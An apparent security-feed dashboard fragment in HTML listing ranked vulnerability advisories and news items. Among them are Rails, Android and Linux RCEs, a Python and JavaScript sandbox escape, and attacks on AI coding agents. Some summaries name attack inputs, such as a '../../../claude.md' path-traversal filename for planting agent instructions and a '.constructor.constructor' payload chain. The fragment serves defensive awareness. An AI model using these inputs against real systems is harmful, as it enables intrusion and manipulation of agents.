+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.2350" data-date="1793889670" data-sevrank="4" data-cvss="9.0" data-corrob="1" data-text="threatsday: apache ofbiz rce, dreamhost breach, defi site hijacks + 17 more stories how much damage can someone do without breaking much? quite a lot, it seems. a stolen login can open doors across several systems. a trusted setting can be used to lock people out. even a simple file copy can reach places it shouldn&#x27;t. and while new tools are helping find security holes faster, some important systems are still taking months, sometimes over a year, to get patched. not exactly a rce breach the hacker news  critical ">
+<div class="rank ">15</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/threatsday-apache-ofbiz-rce-dreamhost.html" target="_blank" rel="noopener">ThreatsDay: Apache OFBiz RCE, DreamHost Breach, DeFi Site Hijacks + 17 More Stories</a></h2>
+<div class="summary">How much damage can someone do without breaking much? Quite a lot, it seems. A stolen login can open doors across several systems. A trusted setting can be used to lock people out. Even a simple file copy can reach places it shouldn&#x27;t. And while new tools are helping find securit…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="kw">rce</span><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.235</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="true" data-score="0.2250" data-date="1793901062" data-sevrank="3" data-cvss="7.5" data-corrob="1" data-text="banks: unsafe importlib.import_module of attacker-controlled tool.import_path in completionextension allows rce affected: banks. ## summary `banks` parses `tool` json objects from the rendered body of `{% completion %}` blocks and later resolves their `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool call. there is no allowlist or sanitization on `import_path`, so any importable python attribute (e.g. `os.system`, `subprocess.getoutput`) can be selected. when the llm emits a `tool_calls` entry whose `function.name` matches the attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from `tool_call.function.argument python rce ghsa — pip cve-2026-61536 high ">
+<div class="rank ">16</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-64vx-6h2c-rjh7" target="_blank" rel="noopener">Banks: Unsafe importlib.import_module of attacker-controlled Tool.import_path in CompletionExtension allows RCE</a></h2>
+<div class="summary">Affected: banks. ## Summary `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool call. There is no all…</div>
+<div class="kws"><span class="sev sev-high">high 7.5</span><span class="cve">CVE-2026-61536</span><span class="kw">python</span><span class="kw">rce</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — pip</span>
+<span>Nov 05</span>
+<span>score 0.225</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.1958" data-date="1793794024" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="critical rails flaw lets attackers write server files via crafted imagemagick uploads a critical flaw in ruby on rails could allow an unauthenticated attacker to write arbitrary files on an app&#x27;s server by uploading a crafted file if the app processes uploads using imagemagick. the rails project disclosed the flaw in&amp;nbsp;an advisory&amp;nbsp;and fixed it in versions 8.1.4.1 and 8.0.5.2. the flaw is in active storage, the part of rails that handles file uploads. some apps store ruby the hacker news  critical ">
+<div class="rank ">17</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/critical-rails-flaw-lets-attackers.html" target="_blank" rel="noopener">Critical Rails Flaw Lets Attackers Write Server Files via Crafted ImageMagick Uploads</a></h2>
+<div class="summary">A critical flaw in Ruby on Rails could allow an unauthenticated attacker to write arbitrary files on an app&#x27;s server by uploading a crafted file if the app processes uploads using ImageMagick. The Rails project disclosed the flaw in&amp;nbsp;an advisory&amp;nbsp;and fixed it in versions …</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="kw">ruby</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.196</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.1726" data-date="1793753631" data-sevrank="4" data-cvss="9.0" data-corrob="1" data-text="risky bulletin: hackers brick chinese evs in russia hackers brick chinese evs in russia, a second wave of hacks defrost european supermarket freezers, the us boots acronis from government networks and the major distros patch a linux kernel rce. linux kernel rce risky business news  critical ">
+<div class="rank ">18</div>
+<div class="body">
+<h2><a href="https://risky.biz/RBNEWS629/" target="_blank" rel="noopener">Risky Bulletin: Hackers brick Chinese EVs in Russia</a></h2>
+<div class="summary">Hackers brick Chinese EVs in Russia, a second wave of hacks defrost European supermarket freezers, the US boots Acronis from government networks and the major distros patch a Linux kernel RCE.</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="kw">linux</span><span class="kw">kernel</span><span class="kw">rce</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">Risky Business News</span>
+<span>Nov 04</span>
+<span>score 0.173</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.1237" data-date="1793778375" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="google issues patches for critical android flaw that could allow rce without user interaction a critical android flaw could allow an attacker to run code on a phone without any user action remotely, google said in its&amp;nbsp;november security bulletin. the flaw, cve-2026-58868, affects android 14 through 17. phones get the fix with security patch level 2026-11-01 or later, which phone makers and carriers send on their own schedules. as of november 4, google&#x27;s bulletin did not report rce cve- the hacker news cve-2026-58868 critical ">
+<div class="rank ">19</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/google-patches-critical-android-flaw.html" target="_blank" rel="noopener">Google Issues Patches for Critical Android Flaw That Could Allow RCE Without User Interaction</a></h2>
+<div class="summary">A critical Android flaw could allow an attacker to run code on a phone without any user action remotely, Google said in its&amp;nbsp;November security bulletin. The flaw, CVE-2026-58868, affects Android 14 through 17. Phones get the fix with security patch level 2026-11-01 or later, …</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="cve">CVE-2026-58868</span><span class="kw">rce</span><span class="kw">cve-</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.124</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="high" data-overflow="true" data-score="0.7440" data-date="1793825946" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="polinrider returns: hijacked npm packages use ethereum blockchain to conceal malware infrastructure overview ox security researchers identified malicious releases of legitimate npm packages compromised in a campaign linked to the polinrider malware family. the injected code uses the ethereum blockchain as a dead drop for command-and-control (c2) infrastructure. when an affected package is imported, a hidden loader queries public ethereum rpc endpoints to retrieve a c2 ip [&amp;#8230;] the post polinrider returns: hijacked npm packages use ethereum blockchain to conceal malware infrastructure appeared first on ox security . npm ox security  high ">
+<div class="rank ">20</div>
+<div class="body">
+<h2><a href="https://www.ox.security/blog/polinrider-returns-hijacked-npm-packages-use-ethereum-blockchain-to-conceal-malware-infrastructure/" target="_blank" rel="noopener">PolinRider Returns: Hijacked npm Packages Use Ethereum Blockchain to Conceal Malware Infrastructure</a></h2>
+<div class="summary">Overview OX Security researchers identified malicious releases of legitimate npm packages compromised in a campaign linked to the PolinRider malware family. The injected code uses the Ethereum blockchain as a dead drop for command-and-control (C2) infrastructure. When an affected…</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">npm</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">OX Security</span>
+<span>Nov 04</span>
+<span>score 0.744</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.6130" data-date="1793802472" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="apt29-linked hackers hijack web analytics script to deliver ios and android exploits the russia-linked threat actor known as apt29 is presumed to be behind a large-scale watering hole campaign targeting ios and android users through compromised websites, fake domains, and a supply chain attack involving a ukrainian web analytics service called plerdy seo tracker. &quot;the injected javascript code collects browser and device attributes,&quot; sekoia researchers amaury-jacques garçon and javascript supply chain the hacker news  high ">
+<div class="rank ">21</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/apt29-linked-hackers-hijack-web.html" target="_blank" rel="noopener">APT29-Linked Hackers Hijack Web Analytics Script to Deliver iOS and Android Exploits</a></h2>
+<div class="summary">The Russia-linked threat actor known as APT29 is presumed to be behind a large-scale watering hole campaign targeting iOS and Android users through compromised websites, fake domains, and a supply chain attack involving a Ukrainian web analytics service called Plerdy SEO Tracker.…</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">javascript</span><span class="kw">supply chain</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.613</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.4346" data-date="1793770991" data-sevrank="3" data-cvss="7.5" data-corrob="1" data-text="cisa confirms hackers exploiting wordpress core flaw during software upgrades the u.s. cybersecurity and infrastructure security agency (cisa) has added a security flaw in wordpress core to the known exploited vulnerabilities (kev) catalog, citing evidence of active exploitation. the high-severity vulnerability, tracked as cve-2026-119977 (cvss score: 8.1), is a case of time-of-check time-of-use (toctou) race condition that could be exploited to achieve arbitrary code kev cve- cvss the hacker news cve-2026-119977 high ">
+<div class="rank ">22</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/cisa-confirms-hackers-exploiting.html" target="_blank" rel="noopener">CISA Confirms Hackers Exploiting WordPress Core Flaw During Software Upgrades</a></h2>
+<div class="summary">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a security flaw in WordPress Core to the Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The high-severity vulnerability, tracked as CVE-2026-119977 (CVSS score: 8.1)…</div>
+<div class="kws"><span class="sev sev-high">high 7.5</span><span class="cve">CVE-2026-119977</span><span class="kw">kev</span><span class="kw">cve-</span><span class="kw">cvss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.435</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.2731" data-date="1793811638" data-sevrank="3" data-cvss="8.0" data-corrob="1" data-text="sonicwall won&#x27;t patch eol gms flaws that could expose files, alter database records sonicwall has warned of two vulnerabilities impacting end-of-life global management system (gms) systems that it said will not be patched. details of the security flaws, which affect sonicwall gms 9.5.2 and earlier versions, are below - cve-2026-109593 (cvss score: 9.1) - an unauthenticated file read vulnerability that could allow an attacker with network access to read internal gms files, sonicwall cve- cvss the hacker news cve-2026-109593 high ">
+<div class="rank ">23</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/sonicwall-wont-patch-eol-gms-flaws-that.html" target="_blank" rel="noopener">SonicWall Won&#x27;t Patch EoL GMS Flaws That Could Expose Files, Alter Database Records</a></h2>
+<div class="summary">SonicWall has warned of two vulnerabilities impacting end-of-life Global Management System (GMS) systems that it said will not be patched. Details of the security flaws, which affect SonicWall GMS 9.5.2 and earlier versions, are below - CVE-2026-109593 (CVSS score: 9.1) - An unau…</div>
+<div class="kws"><span class="sev sev-high">high 8.0</span><span class="cve">CVE-2026-109593</span><span class="kw">sonicwall</span><span class="kw">cve-</span><span class="kw">cvss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.273</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.2237" data-date="1793791471" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="china-aligned hackers hijack sogou input method dns requests to deploy darkvigil backdoor a china-aligned threat actor known as slippynunchucks has been attributed to a domain name system (dns) hijacking operation abusing insecure http communications in windows versions of sogou input method as part of a surveillance campaign designed to deploy an implant called darkvigil (aka fdmtp). the campaign, observed starting july 1, 2026, is assessed to have targeted organizations and windows dns backdoor the hacker news  high ">
+<div class="rank ">24</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/china-aligned-hackers-hijack-sogou.html" target="_blank" rel="noopener">China-Aligned Hackers Hijack Sogou Input Method DNS Requests to Deploy DarkVigil Backdoor</a></h2>
+<div class="summary">A China-aligned threat actor known as SlippyNunchucks has been attributed to a Domain Name System (DNS) hijacking operation abusing insecure HTTP communications in Windows versions of Sogou Input Method as part of a surveillance campaign designed to deploy an implant called DarkV…</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">windows</span><span class="kw">dns</span><span class="kw">backdoor</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.224</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="critical" data-overflow="true" data-score="1.2401" data-date="1793728422" data-sevrank="4" data-cvss="9.8" data-corrob="3" data-text="elo javascript emitter has sandbox escape to arbitrary node.js / browser code execution via unfiltered `.constructor` member access affected: @enspirit/elo. ### summary an unauthenticated attacker who controls a string passed to any elo javascript-emission path — `defaultformats.elo.parse()`, the `bin/elo` cli, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host javascript runtime. a payload built from the `.constructor.constructor` chain compiles, without modification, to a live `function` invocation in the emitted javascript, escaping any sandbox assumption around &quot;elo is a safe data/dsl language.&quot; ### vulnerable sink and root cause three interacting sites in `src/` produce the bug at commit `749af7b` node javascript ghsa — npm cve-2026-44265 cve-2026-44266 cve-2026-44267 critical ghsa — npm ghsa — npm">
+<div class="rank ">25</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-33r5-xmm8-v6x5" target="_blank" rel="noopener">Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access</a></h2>
+<div class="summary">Affected: @enspirit/elo. ### Summary An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaS…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.8</span><span class="corrob">×3 reports</span><span class="cve">CVE-2026-44265</span><span class="cve">CVE-2026-44266</span><span class="cve">CVE-2026-44267</span><span class="kw">node</span><span class="kw">javascript</span></div>
+<div class="also">also: <a href="https://github.com/advisories/GHSA-7w38-ggh5-v542" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — npm</a>, <a href="https://github.com/advisories/GHSA-x9rp-7wh3-2rj5" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — npm</a></div>
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — npm</span>
+<span>Nov 03</span>
+<span>score 1.240</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.3487" data-date="1793684081" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="attackers exploit critical siemens iot2050 flaw to plant remote command backdoors a maximum-severity security flaw impacting siemens simatic iot2050 advanced devices has come under active exploitation, vulncheck has revealed. the vulnerability, tracked as cve-2026-58115 (cvss score: 10.0), is a case of missing authentication for a critical function that could be exploited by an unauthenticated remote attacker to run arbitrary code. &quot;simatic iot2050 advanced devices running exploit cve- cvss the hacker news cve-2026-58115 critical ">
+<div class="rank ">26</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/attackers-exploit-critical-siemens.html" target="_blank" rel="noopener">Attackers Exploit Critical Siemens IoT2050 Flaw to Plant Remote Command Backdoors</a></h2>
+<div class="summary">A maximum-severity security flaw impacting Siemens SIMATIC IoT2050 Advanced devices has come under active exploitation, VulnCheck has revealed. The vulnerability, tracked as CVE-2026-58115 (CVSS score: 10.0), is a case of missing authentication for a critical function that could …</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="cve">CVE-2026-58115</span><span class="kw">exploit</span><span class="kw">cve-</span><span class="kw">cvss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.349</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.1614" data-date="1793705033" data-sevrank="4" data-cvss="9.0" data-corrob="1" data-text="red hat patches 9.8-rated linux tcp rce flaw while ubuntu releases fixes for testing fixed kernels for a&amp;nbsp;use-after-free vulnerability in the linux kernel&#x27;s ipv4 tcp code&amp;nbsp;are now available for red hat enterprise linux 8, 9, and 10, while ubuntu&#x27;s fixes for its three newest long-term-support releases remain in its opt-in testing channel with no date for a regular update. the flaw, tracked as cve-2026-98432, can be reached by a remote, unauthenticated attacker and can linux kernel ubuntu rce cve- the hacker news cve-2026-98432 critical ">
+<div class="rank ">27</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/red-hat-patches-98-rated-linux-tcp-rce.html" target="_blank" rel="noopener">Red Hat Patches 9.8-Rated Linux TCP RCE Flaw While Ubuntu Releases Fixes for Testing</a></h2>
+<div class="summary">Fixed kernels for a&amp;nbsp;use-after-free vulnerability in the Linux kernel&#x27;s IPv4 TCP code&amp;nbsp;are now available for Red Hat Enterprise Linux 8, 9, and 10, while Ubuntu&#x27;s fixes for its three newest long-term-support releases remain in its opt-in testing channel with no date for a…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="cve">CVE-2026-98432</span><span class="kw">linux</span><span class="kw">kernel</span><span class="kw">ubuntu</span><span class="kw">rce</span><span class="kw">cve-</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.161</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="true" data-score="1.1352" data-date="1793727704" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="hardening github actions against outside threats a practical guide to securing github actions against supply chain attacks, covering malicious pull requests, credential theft, dependency risks, and release pipelines. github github actions supply chain credential socket blog  high ">
+<div class="rank ">28</div>
+<div class="body">
+<h2><a href="https://socket.dev/blog/hardening-github-actions-against-outside-threats?utm_medium=feed" target="_blank" rel="noopener">Hardening GitHub Actions Against Outside Threats</a></h2>
+<div class="summary">A practical guide to securing GitHub Actions against supply chain attacks, covering malicious pull requests, credential theft, dependency risks, and release pipelines.</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">github</span><span class="kw">github actions</span><span class="kw">supply chain</span><span class="kw">credential</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">Socket Blog</span>
+<span>Nov 03</span>
+<span>score 1.135</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.3868" data-date="1793718992" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="cpguard update channel hijacked to backdoor linux servers and collect password hashes an attacker broke into the update system of the cpguard security tool on november 2 and used it to send a malicious script to customers&#x27; linux servers. the script installed a backdoor and collected password hashes and other sensitive files from servers that ran it, cpguard maker opsshield said in an advisory. in a later disclosure, opsshield said about 2,950 customer servers ran the script, linux backdoor the hacker news  high ">
+<div class="rank ">29</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/cpguard-update-channel-hijacked-to.html" target="_blank" rel="noopener">cPGuard Update Channel Hijacked to Backdoor Linux Servers and Collect Password Hashes</a></h2>
+<div class="summary">An attacker broke into the update system of the cPGuard security tool on November 2 and used it to send a malicious script to customers&#x27; Linux servers. The script installed a backdoor and collected password hashes and other sensitive files from servers that ran it, cPGuard maker …</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">linux</span><span class="kw">backdoor</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.387</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="true" data-score="0.3278" data-date="1793726845" data-sevrank="3" data-cvss="8.2" data-corrob="1" data-text="praktor: path traversal in telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection) affected: github.com/mtzanidakis/praktor. ### impact a remote telegram user can write files to arbitrary paths inside an agent&#x27;s persistent workspace volume (`praktor-wk-&lt;workspace&gt;`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory. the attacker controls the telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.join`, which collapses `../` sequences. a filename like `../../../claude.md` resolved to the root of the agent workspace volume, outside `uploads/`. because the agent workspace i github ghsa — go cve-2026-62331 high ">
+<div class="rank ">30</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-48v2-6jcm-fc99" target="_blank" rel="noopener">praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)</a></h2>
+<div class="summary">Affected: github.com/mtzanidakis/praktor. ### Impact A remote Telegram user can write files to arbitrary paths inside an agent&#x27;s persistent workspace volume (`praktor-wk-&lt;workspace&gt;`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory. The attacker contr…</div>
+<div class="kws"><span class="sev sev-high">high 8.2</span><span class="cve">CVE-2026-62331</span><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 03</span>
+<span>score 0.328</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="true" data-score="0.1526" data-date="1793737756" data-sevrank="3" data-cvss="7.8" data-corrob="1" data-text="stanza: rce via pickle deserialization in the lemmatizer affected: stanza. ## tl;dr loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint&#x27;s `dicts` field (a `bytes` value). `torch.load(weights_only=true)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. result: `weights_only=true` gives no protection here, and model loading executes code. confirmed end-to-end against sta checkpoint rce deserialization ghsa — pip cve-2026-115878 high ">
+<div class="rank ">31</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-gh9r-c94j-cmp5" target="_blank" rel="noopener">Stanza: RCE via pickle deserialization in the lemmatizer</a></h2>
+<div class="summary">Affected: stanza. ## TL;DR Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint&#x27;s `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `byte…</div>
+<div class="kws"><span class="sev sev-high">high 7.8</span><span class="cve">CVE-2026-115878</span><span class="kw">checkpoint</span><span class="kw">rce</span><span class="kw">deserialization</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — pip</span>
+<span>Nov 03</span>
+<span>score 0.153</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.1253" data-date="1793684077" data-sevrank="3" data-cvss="8.0" data-corrob="1" data-text="attackers target unpatched cryptopayment gateway flaw that can expose wallet credentials threat actors are attempting to exploit an unpatched maximum-severity security vulnerability in the cryptopayment gateway wordpress plugin, according to findings from defused cyber. the vulnerability in question is cve-2026-81648, which carries a cvss score of 10.0. successful exploitation of the flaw could permit unauthenticated users to delete arbitrary files on the server and extract exploit cve- cvss the hacker news cve-2026-81648 high ">
+<div class="rank ">32</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/attackers-target-unpatched.html" target="_blank" rel="noopener">Attackers Target Unpatched CryptoPayment Gateway Flaw That Can Expose Wallet Credentials</a></h2>
+<div class="summary">Threat actors are attempting to exploit an unpatched maximum-severity security vulnerability in the CryptoPayment Gateway WordPress plugin, according to findings from Defused Cyber. The vulnerability in question is CVE-2026-81648, which carries a CVSS score of 10.0. Successful ex…</div>
+<div class="kws"><span class="sev sev-high">high 8.0</span><span class="cve">CVE-2026-81648</span><span class="kw">exploit</span><span class="kw">cve-</span><span class="kw">cvss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.125</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.2881" data-date="1793638676" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="⚡ weekly recap: critical cves, linux ddos botnet, device-code phishing, android spyware and more some attacks this week didn&#x27;t need much of a trick. a fake support call, a trusted extension, a shared link, or a device with no password. small things that people barely think about. yet each was enough to cause serious trouble. then there were the bigger messes. billions stolen, hidden networks of hacked devices, poisoned software, and attackers finding new ways to turn normal tools against linux the hacker news  critical ">
+<div class="rank ">33</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/weekly-recap-critical-cves-linux-ddos.html" target="_blank" rel="noopener">⚡ Weekly Recap: Critical CVEs, Linux DDoS Botnet, Device-Code Phishing, Android Spyware and More</a></h2>
+<div class="summary">Some attacks this week didn&#x27;t need much of a trick. A fake support call, a trusted extension, a shared link, or a device with no password. Small things that people barely think about. Yet each was enough to cause serious trouble. Then there were the bigger messes. Billions stolen…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="kw">linux</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 02</span>
+<span>score 0.288</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="true" data-score="0.2747" data-date="1793642079" data-sevrank="3" data-cvss="0.0" data-corrob="1" data-text="sd jwt js: tampered disclosures silently dropped instead of rejected affected: @sd-jwt/decode, @sd-jwt/core. ## summary when one disclosure in an sd-jwt presentation is tampered so its digest no longer matches the issuer-signed `_sd` array, `@sd-jwt/decode` 0.19.0 does **not** reject the presentation. it silently drops the unmatched disclosure and returns a **reduced claim set**, reporting success. the issuer signature is untouched and valid. this is a downgrade/omission primitive. a malicious or curious **holder** can present a tampered disclosure and have the relying party receive *fewer* claims than the credential carries, with no error surfaced. where the relying party does **not** enforce key jwt credential ghsa — npm cve-2026-62374 high ">
+<div class="rank ">34</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-f9j6-8p6x-r9j6" target="_blank" rel="noopener">SD JWT JS: Tampered disclosures silently dropped instead of rejected</a></h2>
+<div class="summary">Affected: @sd-jwt/decode, @sd-jwt/core. ## Summary When one Disclosure in an SD-JWT presentation is tampered so its digest no longer matches the Issuer-signed `_sd` array, `@sd-jwt/decode` 0.19.0 does **not** reject the presentation. It silently drops the unmatched Disclosure and…</div>
+<div class="kws"><span class="sev sev-high">high</span><span class="cve">CVE-2026-62374</span><span class="kw">jwt</span><span class="kw">credential</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — npm</span>
+<span>Nov 02</span>
+<span>score 0.275</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="true" data-score="0.1427" data-date="1793634626" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="google disrupts 1.3 million-device android botnet, says tv box maker sold criminal access a botnet of more than 1.3 million android devices, mostly tv set-top boxes, lost control of its servers in late october in a takedown led by google. google says&amp;nbsp;it is highly confident that device maker videostrong intentionally put a backdoor in the boxes and sold access to criminals. they used the boxes for ad fraud and to pass other people&#x27;s internet traffic through owners&#x27; home backdoor the hacker news  high ">
+<div class="rank ">35</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/google-disrupts-13-million-device.html" target="_blank" rel="noopener">Google Disrupts 1.3 Million-Device Android Botnet, Says TV Box Maker Sold Criminal Access</a></h2>
+<div class="summary">A botnet of more than 1.3 million Android devices, mostly TV set-top boxes, lost control of its servers in late October in a takedown led by Google. Google says&amp;nbsp;it is highly confident that device maker Videostrong intentionally put a backdoor in the boxes and sold access to …</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">backdoor</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 02</span>
+<span>score 0.143</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.5367" data-date="1794009655" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="sonicwall warns of new ssl-vpn mfa bypass flaw exploited in attacks sonicwall has released security updates to fix seven vulnerabilities in sonicos firewalls, including an ssl-vpn authentication bypass flaw exploited in attacks. [...] mfa ssl vpn sonicwall authentication bypass bleepingcomputer   ">
+<div class="rank ">36</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-new-ssl-vpn-mfa-bypass-flaw-exploited-in-attacks/" target="_blank" rel="noopener">SonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks</a></h2>
+<div class="summary">SonicWall has released security updates to fix seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks. [...]</div>
+<div class="kws"><span class="kw">mfa</span><span class="kw">ssl</span><span class="kw">vpn</span><span class="kw">sonicwall</span><span class="kw">authentication bypass</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 07</span>
+<span>score 0.537</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.1495" data-date="1794033857" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="claude code&#x27;s “don&#x27;t ask again” file exposes passwords and keys in 1,122 public copies on github passwords and api keys that developers typed into commands they approved in claude code are sitting in public github repositories, where anyone can read them. when a user selects &quot;yes, and don&#x27;t ask again,&quot; anthropic&#x27;s ai coding assistant can save the command, word-for-word, including the secret, in a project settings file. software security company apiiro said yesterday that 1,122 public github the hacker news   ">
+<div class="rank ">37</div>
+<div class="body">
